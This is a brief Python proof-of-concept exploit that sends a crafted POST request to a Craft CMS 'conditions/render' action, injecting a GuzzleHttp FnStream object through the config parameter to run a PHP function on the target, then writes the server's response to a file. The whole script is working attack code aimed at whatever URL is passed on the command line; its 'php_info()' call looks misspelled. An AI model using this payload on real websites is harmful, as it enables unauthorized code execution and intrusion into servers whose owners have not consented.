#!/usr/bin/env python3

import requests
import re
import sys

headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.88 Safari/537.36"
}

data = {
    "action": "conditions/render",
    "configObject[class]": "craft\elements\conditions\ElementCondition",
    "config": r"""{"name":"configObject","as ":{"class":"\\GuzzleHttp\\Psr7\\FnStream", "__construct()":{"methods":{"close":"php_info()"}}}}"""
}

response = requests.post(sys.argv[1], headers=headers, data=data)
with open('output', 'wb') as out:
    out.write(response.content)
